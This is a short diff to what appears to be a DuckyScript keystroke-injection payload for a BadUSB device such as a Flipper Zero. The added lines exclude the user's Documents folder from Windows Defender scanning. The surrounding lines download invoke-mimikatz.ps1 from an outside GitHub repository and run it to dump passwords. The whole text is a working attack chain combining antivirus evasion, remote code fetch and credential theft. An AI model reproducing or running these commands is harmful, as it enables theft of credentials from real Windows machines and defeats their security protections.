@@ -53,6 +53,11 @@ STRING cd  $env:systemdrive\users\$env:username\Documents
 DELAY 500
 ENTER
 DELAY 1000
+REM Path exclude from defender. We need it later
+STRING Set-MpPreference -ExclusionPath $env:systemdrive\users\$env:username\Documents
+DELAY 500
+ENTER
+DELAY 1000
 REM Get the invoke-mimikatz.ps1.
 STRING wget https://raw.githubusercontent.com/Hacktivist2023/payloads/master/flipper%20zero/checked/invoke-mimikatz.ps1 -O invoke-mimikatz.ps1
 DELAY 500
@@ -62,3 +67,4 @@ REM Start the get_password.ps1
 STRING .\invoke-mimikatz.ps1
 DELAY 500
 ENTER
+DELAY 1000
